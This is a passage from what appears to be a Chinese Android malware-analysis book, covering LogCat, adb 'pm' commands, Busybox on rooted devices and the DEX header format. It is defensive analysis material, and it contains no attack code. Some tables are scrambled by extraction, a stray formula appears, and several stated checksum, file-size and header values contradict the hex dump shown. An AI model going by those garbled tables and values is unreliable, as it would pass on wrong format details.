/data/data/com.android.voicedialer/files/openentries.txt

I/ActivityManager( 857): Start proc com.svox.pico for broadcast
com.svox.pico/.VoiceDataInstallerReceiver: pid=1332 uid=10018 gids={}

D/dalvikvm( 857): GC_EXPLICIT freed 681K, 44% free 4346K/7687K, external 3027K/3780K, paused 124ms

I/ActivityThread( 1332): Pub com.svox.pico.providers.SettingsProvider: com.svox.pico.providers.SettingsProvider

D/AndroidRuntime(1288): Shutting down VM

D/dalvikvm( 1288): GC_CONCURRENT freed 100K, 72% free 290K/1024K, external 0K/0K, paused 0ms+2ms
D/jdwp ( 1288): adbd disconnected

Eclipse的调试环境支持LogCat。点击Eclipse右上角的“Debug”转换到调试模式后(图2-103)，点击下面的“LogCat”标签就能浏览控制台模式中进行的操作。

 </div>

 </div>

也有App能够直接在支持LogCat的设备上查看。可以保存实时产生的日志，保存的日志可以用于之后查看PC上漏掉的信息。

https://play.google.com/store/apps/details?id=ukzzang.android.app.logviewer&hl=ko

 </div>

#### 2.4.4 使用pm命令获取设备信息

pm是package manager的缩写。管理软件包时可以使用简单的命令查看设备的各种信息。主要选项如下.

usage: pm [list|path|install|uninstall]
    pm list packages [-f]
    pm list permission-groups
    pm list permissions [-g] [-f] [-d] [-u] [GROUP]
    pm list instrumentation [-f] [TARGET-PACKAGE]
    pm list features
    pm path PACKAGE
    pm install [-l] [-r] [-t] [-i INSTALLER_PACKAGE_NAME] [-s] [-f] PATH
    pm uninstall [-k] PACKAGE
    pm enable PACKAGE_OR_COMPONENT
    pm disable PACKAGE_OR_COMPONENT
    pm setInstallLocation [0/auto] [1/internal] [2/external]

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>list packages</td><td style='text-align: center; word-wrap: break-word;'>显示所有软件包</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-f选项</td><td style='text-align: center; word-wrap: break-word;'>显示分配的文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>list permissions-groups</td><td style='text-align: center; word-wrap: break-word;'>显示所有已知权限组</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>list permissions</td><td style='text-align: center; word-wrap: break-word;'>显示所有已知权限，用选项选择组</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-g选项</td><td style='text-align: center; word-wrap: break-word;'>指定组</td></tr></table>

(续)

主要选项
-f选项
-s选项
-d选项
-u选项

显示所有信息
显示简介
只显示危险权限
只显示用户可用权限

list instrumentation
-f选项

list features
path

install
-l选项
-r选项
-t选项
-i选项
-s选项
-f选项

显示所有设备，可以设置特定对象
查看分配的文件
显示所有系统现状
显示软件包的.apk文件路径
安装软件包
安装包含FORWARD_LOCK的软件包
保留数据，重新安装App
允许测试已安装的.apk文件
特定安装包名称
在sdcard中安装软件包
在内部闪存中安装软件包
卸载软件包
卸载后保留数据和缓存文件夹
切换软件包和组件的enable状态
查看当前安装路径
指定到系统顶端
安装到内部储存器
安装到外部媒体
修改默认安装的路径
指定到系统顶端
安装到内部储存器
安装到外部媒体
说明

可以通过pm list命令查看软件包信息。不需要搜索软件包安装的位置，很简单。

C:\Users\Administrator&gt;adb shell pm list packages | more
package:com.google.android.location
package:com.sec.android.app.camerafirmware
package:android.game
package:com.sec.android.app.phoneutil
package:com.sec.android.KTNetwork
package:com.sec.android.app.unifiedinbox
package:com.monotype.android.font.tinkerbell
package:com.android.defcontainer
package:com.sec.android.app.snsaccount
package:com.android.contacts
package:com.android.phone
package:com.kt.android.show.ntq

package:org.connectbot
package:com.android.htmlviewer
package:com.android.bluetooth
package:com.android.providers.calendar
package:com.samsung.android.app.divx
package:com.android.calendar
package:com.android.browser
package:com.android.music
package:com.sec.android.provider.badge
package:com.weathernews.Weather
package:com.sec.android.app.selftestmode
package:com.sec.android.app.shutdown
package:com.monotype.android.font.applemint
... (省略) ...

输入pm list permissions命令查看系统设置权限信息。下列代码显示了所有软件包（App）相关权限信息。

C:\Users\Administrator&gt;adb shell pm list permissions

All Permissions:

permission:com.kt.olleh.permission.PLATFORM_SMS_RUN
permission:android.permission.INTERNAL_SYSTEM_WINDOW
permission:com.swype.android.inputmethod.PRIVATE_COMMANDS
permission:android.permission.MOVE_PACKAGE
permission:com.kt.olleh.permission.SETTING_CHANGE
permission:android.permission.READ_INPUT_STATE
permission:com.google.android.providers.settings.permission.READ_GSETTINGS
permission:android.permission.REBOOT
permission:com.android.vending.billing.BILLING_ACCOUNT_SERVICE
permission:android.permission.STATUS_BAR
permission:com.kt.olleh.permission.STATUS_RECEIVERD
permission:android.permission.ACCESS_DOWNLOAD_MANAGER_ADVANCED
permission:android.permission.STOP_APP_SWITCHES
permission:com.kt.olleh.permission.BROADCAST_OLLEH_MARKET_REFESH_CONTENT
permission:android.permission.MANAGE_APP_TOKENS
permission:android.permission.BATTERY_STATS
permission:com.sec.android.app.snsaccount.permission.READ_SNSACCOUNTDB
permission:com.sec.android.app.sns.permission.RECEIVE_SNS_BROADCAST
permission:android.permission.COPY_PROTECTED_DATA
permission:com.android.email.permission.ACCESS_PROVIDER
permission:android.server.checkin.CHECKIN.permission.C2D_MESSAGE
permission:android.permission.MASTER_CLEAR
permission:com.sec.android.app.contacts.permission.RECEIVE_CONTACTS_BROADCAST
permission:android.permission.SEE_ALL_EXTERNAL
permission:com.kt.olleh.permission.DOWNLOAD_PROVIDER
permission:android.permission.INJECT_EVENTS
permission:com.kt.olleh.permission.CONTENTS_PROVIDER
permission:android.permission.ACCESS_BLUETOOTH_SHARE
permission:android.permission.WRITE_SECURE_SETTINGS
permission:com.kt.olleh.permission.SETTING_PROVIDER
…（省略）

可以在获取的软件包信息中使用pm_path获取apk文件的保存位置。

C:\Users\Administrator>adb shell pm path com.android.certinstaller package:/system/app/CertInstaller.apk

可参考下列URL。

☐ http://www.cheatography.com/citguy/cheat-sheets/android-package-managerpm/

#### 2.4.5 使用Busybox扩展Android系统命令

进入Android移动终端后，即使已获取Root权限，但因为设备中自带的命令很少，分析系统时依然会遇到很多限制。此时可以安装UNIX分析工具包Busybox $ ^{①} $，更轻松地对移动终端进行分析，也可以使用多种命令行选项。工具包含有调试详细信息（dmesg）、进程信息（ps）、端口信息（pscan）、获取文件（wget）等工具。

 </div>

在Google Play App搜索Busybox并下载安装即可。因为会安装到/system/bin文件夹，所以需要Root权限。

 </div>

安装Busybox后，系统会支持如下命令。命令使用帮助可以参考 http://www.busybox.net/ downloads/BusvBox.html。

[[, acpid, addgroup, adduser, adjtimex, ar, arp, arping, ash, awk, basename, beep, blkid, brctl, bunzip2, bzcat, bzip2, cal, cat, catv, chat, chattr, chgrp, chmod, chown, chpasswd, chpst, chroot, chrt, chvt, cksum, clear, cmp, comm, cp, cpio, crond, crontab, cryptpw, cut, date, dc, dd, deallocvt, delgroup, deluser, depmod, devmem, df, dhcprelay, diff, dirname, dmesg, dnsd, dnsdomainname, dos2unix, dpkg, du, dumpmap, dumpleases, echo, ed, egrep, eject, env, envdir, envuidgid, expand, expr, fakeidentd, false, fbset, fbsplash, fdflush, fdformat, fdisk, fgrep, find, findfs, flash_lock, flash_unlock, fold, free, freeramdisk, fsck, fsck.minix, fsync, ftpd, ftpget, ftpput, fuser, getopt, getty, grep, gunzip, gzip, hd, hdparm, head, hexdump, hostid, hostname, httpd, hush, hwclock, id, ifconfig, ifdown, ifenslave, ifplugd, ifup, inetd, init, inotifyd, insmod, install, ionice, ip, ipaddr, ipcalc, ipcrm, ipcs, iplink, iproute, iprule, iptunnel, kbd_mode, kill, killall, killall15, klogd, last, length, less, linux32, linux64, linuxrc, ln, loadfont, loadmap, logger, login, logname, logread, losetup, lpd, lpq, lpr, ls, lsattr, lsmod, lzmacat, lzop, lzopcat, makemime, man, md5sum, mdev, mesg, microcom, mkdir, mkdosfs, mkfifo, mkfs.minix, mkfs.vfat, mknod, mkpasswd, mkswap, mktemp, modprobe, more, mount, mountpoint, mt, mv, nameif, nc, netstat, nice, nmeter, nohup, nslookup, od, openvt, passwd, patch, pgrep, pidof, ping, ping6, pipe_progress, pivot_root, pkill, popmaildir, printenv, printf, ps, pscan, pwd, raidautorun, rdate, rdev, readlink, readprofile, realpath, reformime, renice, reset, resize, rm, rmdir, rmmod, route, rpm, rpm2cpio, rtcwake, run-parts, runlevel, runsv, runsvdir, rx, script, scriptreplay, sed, sendmail, seq, setarch, setconsole, setfont, setkeycodes, setlogcons, setsid, setuidgid, sh, shalsum, sha256sum, sha512sum, showkey, slattach, sleep, softlimit, sort, split, start-stop-daemon, stat, strings, stty, su, sulogin, sum, sv, svlogd, swapoff, swapon, switch_root, sync, systl, syslogd, tac, tail, tar, taskset, tcpsvd, tee, telnet, telnetd, test, tftp, tftpd, time, timeout, top, touch, tr, traceroute, true, tty, ttysize, udhcpc, udhcpd,

udpsvd, umount, unàme, uncompress, unexpand, uniq, unix2dos, unlzma, unlzop, unzip, uptime, usleep, uudecode, uuencode, vconfig, vi, vlock, volname, watch, watchdog, wc, wget, which, who, whoami, xargs, yes, zcat, zcip

现在即可运行未默认安装的命令。图2-108是Busybox工具包的wget命令运行画面。

 </div>

### 2.5 使用编辑器分析文件格式

恶意代码的攻击形态正在进化。DEX文件结构也有压缩文件的特性，恶意使用这种特性的例子也在逐渐增加。还出现了在DEX文件中生成新恶意代码（名为Dropper）的形式。分析进化的恶意代码可能比分析PC二进制文件更加复杂。

分析Windows恶意代码时,最重要的是分析EXE和DLL文件的PE结构。同理,分析Android App时,对dex文件结构的理解也很重要。反编译不在本书范畴之内,下面对其进行简单介绍,然后学习如何分析文件格式。

本节内容可能稍显枯燥，理解起来也会有些难度。第7章将给出使用文件格式的示例，届时再回顾本章将有更好的效果。

下面使用编辑器分析Android环境下的DEX（Dalvix excutable）文件。此分析方法可以在第7章的第四个问题解答中看到。推荐使用分析工具010编辑器 $ ^{①} $，这款工具可以免费使用30天。

   </div>

010编辑器的优点是，可以通过制作模板简单查看各种文件系统结构，也可以发布自己制作的模板。因此，如果对文件系统结构的学习比较深入，还可以自己尝试制作。目前已经发布了检查DEX文件结构的模板，可以在模板网站 $ ^{②} $上下载。

将下载后的模板保存到适当位置.(Windows 7环境下的默认位置是C:\Users\Administrator\Documents\SweetScape\010 Templates。我也是保存在这个文件夹后运行010编辑器的，然后选择

Templates > Edit Template List菜单), 保存模板名和路径后即可轻松注册。下面通过此模板开始分析DEX文件。

 </div>

 </div>

打开DEX文件后，图2-111顶端会显示Hex值，模板在下端自动排序并显示DEX文件结构。点击下端的结构时，也会选中相应的Hex值。

 </div>

 </div>

也可以在用户命令行窗口查看DEX文件结构。下载ddx1.18.jar $ ^{①} $文件后，输入如下命令就会生成txt文件。打开文件即可看到前面010编辑器显示的内容。

 </div>

00000000 : 64 65 78 0A

30 33 35 00

magic: dex\n035\0

00000008 : 51 3C CD 05

checksum

0000000C : A2 2E DC 2B

14 F4 1C 20

FB 6F C8 42

57 D9 A8 C6

E3 33 15 37

signature

00000020 : 6C 1A 07 00

file size: 0x00071A6C

00000024 : 70 00 00 00

header size: 0x00000070

00000028 : 78 56 34 12

00 00 00 00

link size: 0x00000000

00000030 : 00 00 00 00

link offset: 0x00000000

00000034 : D8 19 07 00

map offset: 0x000719D8

00000038 : E0 07 00 00

string ids size: 0x000007E0

0000003C : 70 00 00 00

string ids offset: 0x00000070

00000040 : 7A 03 00 00

type ids size: 0x0000037A

00000044 : F0 1F 00 00

type ids offset: 0x00001FF0

□ header_item: 与其他头信息相同，包含文件的所有信息，比如文件大小、文件内的位置信息等。

□ string_id_list：包含文件的所有字符内容。

□ type_id_list：包含Java文件的type信息。

□ proto_id_list：包含prototype相关信息。

□ field_id_list: 包含字段信息。

□ method_id_list：包含方法信息。

□ class_def_item_list: 包含类信息。

 </div>

开始分析前，如图2-115所示设置编辑器，以隐藏Name值的不必要信息。

 </div>

从头信息开始逐一讲解文件格式的话，内容实在过于庞杂，故此处只简单介绍头信息的分析过程。各位以后可以该案例为基础进行分析。无需查看所有文件格式，先学习分析过程。

可以通过图2-117的Comment部分看到Header区域，其中包含了Magic值、文件大小、校验和、需要读取dex文件（classes.dex）的哪个位置等内容。

 </div>

 </div>

除了magic（8字节）、Signature（20字节）以外，头文件结构其他项目的大小都是4字节。下面介绍用头编辑器查看到的头信息组成内容。

# 1. magic

头区域的起始8字节是幻数（magic number）。最后的n035\0是换行回车字符和Null值，用于防止破坏幻数值。

 </div>

# 2. Checksum

除幻数以外的其他文件的校验和值，使用了adler32算法。因为是用小端序方式保存的，所以是x07784031。

 </div>

# 3. Signature

除幻数、校验和之外的其他文件的SHA-1算法识别标志，用于识别固有文件。

 </div>

# 4. file size

文件大小，因为使用小端序方式，所以是0x6100。

 </div>

# 5. Header size

头大小，始终为 $ 0\times70 $。

 </div>

# 6. endian_tag

顾名思义，是小端序（little-endian）标签。值为0x12345678，表示数据使用小端序方式保存。

 </div>

# 7. link_size

Link节区大小。未静态连接时会设置为 “0”（link_data区域的大小）。

 </div>

# 8. link off

从文件起始到连接会话的位移值（offset）。如果 link_size 是 0，它也会被设置为 0。如果不是 0，位移值应该是 link_data 节区的位移值（link_data 区域的位置）。

 </div>

如上依次分析文件就能掌握DEX文件结构。第3章介绍的DEX文件分析工具也会通过查看这种文件系统结构获取信息。

##### ① DEX文件格式结构补充说明

# 1.文件头

头信息保存着所有文件信息的摘要，并按照以下顺序定义。所有的值均使用小端序方式保存，后文会对头信息进行详细分析。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大</td><td style='text-align: center; word-wrap: break-word;'>小</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x0</td><td style='text-align: center; word-wrap: break-word;'>8</td><td style='text-align: center; word-wrap: break-word;'>幻数: &quot;dex\n009\0&quot;</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x8</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>校验和</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0xC</td><td style='text-align: center; word-wrap: break-word;'>20</td><td style='text-align: center; word-wrap: break-word;'>SHA-1 Signature</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x20</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>文件长度（字节）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x24</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>头长度（始终为0x5C）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x28</td><td style='text-align: center; word-wrap: break-word;'>8</td><td style='text-align: center; word-wrap: break-word;'>填充（预留空间）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x30</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字符列表中的字符值</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x34</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字符列表的绝对位移值</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x38</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字符相关空间</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x3C</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>类项目中的类的数量</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x40</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>类项目的绝对位移值</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x44</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字段列表中的字段数量</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x48</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字段列表的绝对位移值</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x4C</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>方法列表中的方法数量</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x50</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>方法列表的绝对位移值</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x54</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>类定义列表中的类定义数量</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x58</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>类定义列表的绝对位移值</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 $ x_{1} + x_{2} = 0 $

# 2. 字符列表

该列表保存字符串常量、类名、变量名等Dex文件中的所有字符串长度和位移。各项目格式如表2-9所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大</td><td style='text-align: center; word-wrap: break-word;'>小</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x0</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字符数据的绝对位移值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字符长度（不包含Null中断值）</td></tr></table>

# 3. 类项目

显示所有dex文件浏览或包含的类项目。所有入口值遵循表2-10中的格式。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大 小</td><td style='text-align: center; word-wrap: break-word;'>说 明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x0</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>类名称的字符索引</td></tr></table>

# 4. 字段列表

显示dex文件中定义的所有类的字段列表信息。所有入口值遵循表2-11中的格式。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大</td><td style='text-align: center; word-wrap: break-word;'>小</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x0</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字段中包含的类的现有索引</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字段名称的字符索引</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x8</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字段格式描述符字符索引</td></tr></table>

# 5. 方法列表

显示dex文件中定义的所有类的字段列表信息。所有入口值遵循表2-12中的格式。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大</td><td style='text-align: center; word-wrap: break-word;'>小</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x0</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>字段中包含的类的现有索引</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>方法名称的字符索引</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x8</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>方法格式描述符字符索引</td></tr></table>

# 6. 类定义列表

为了dex文件中定义的或包含方法的类，以及在dex文件中被代码访问的字段而定义的类列表信息。所有入口值遵循表2-13中的格式。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大</td><td style='text-align: center; word-wrap: break-word;'>小</td><td style='text-align: center; word-wrap: break-word;'>说</td><td style='text-align: center; word-wrap: break-word;'>明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x0</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>类索引</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>访问插口</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x8</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>超级类的索引</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0xC</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>界面项目的绝对位移</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>（续）</td></tr></table>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大</td><td style='text-align: center; word-wrap: break-word;'>小</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x10</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>静态字段项目的绝对位移</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x14</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>实例字段项目的绝对位移</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x18</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>非虚拟方法项目的绝对位移</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x1C</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>虚拟方法项目的绝对位移</td></tr></table>

为了dex文件中定义的或包含方法的类，以及在dex文件中被代码访问的字段而定义的类列表信息。所有入口都遵循表2-14的格式。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大</td><td style='text-align: center; word-wrap: break-word;'>小</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x0</td><td style='text-align: center; word-wrap: break-word;'>8</td><td colspan="2">字符串索引、对象常量索引或primitive常量索引</td></tr></table>

# 8. 方法项目

针对部分类的方法项目。如表2-15的格式所示，以包含源自入口的链表项目数量的32位常量起始。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大</td><td style='text-align: center; word-wrap: break-word;'>小</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x0</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>方法索引</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>访问入口</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x8</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>针对执行方法代码的头绝对位移</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0xC</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>针对执行方法代码的头绝对位移</td></tr></table>

# 9. 代码头

包含了方法执行的代码信息。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大</td><td style='text-align: center; word-wrap: break-word;'>小</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x0</td><td style='text-align: center; word-wrap: break-word;'>2</td><td style='text-align: center; word-wrap: break-word;'>方法调用的注册表数量</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x2</td><td style='text-align: center; word-wrap: break-word;'>2</td><td style='text-align: center; word-wrap: break-word;'>方法拥有的输入值数量</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x4</td><td style='text-align: center; word-wrap: break-word;'>2</td><td style='text-align: center; word-wrap: break-word;'>输出大小</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x6</td><td style='text-align: center; word-wrap: break-word;'>2</td><td style='text-align: center; word-wrap: break-word;'>填充值</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x8</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>执行方法的源代码文件名称的字符索引</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0xC</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>执行方法的实际代码的绝对位移</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x10</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>方法引发的错误项目的绝对位移</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x14</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>地址值项目的绝对位移和调试对象的成对行编号</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x1C</td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>方法的项目中，局部变量值的绝对位移</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

# 10. 局部变量值项目

显示针对特定方法的局部变量值项目。以包含链表项目数量的32位常量起始。各入口值遵守表2-17中的格式。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>位移值</td><td style='text-align: center; word-wrap: break-word;'>大小</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x0</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>开始</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x4</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>结尾</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x8</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>变量名称的字符索引</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0xC</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: 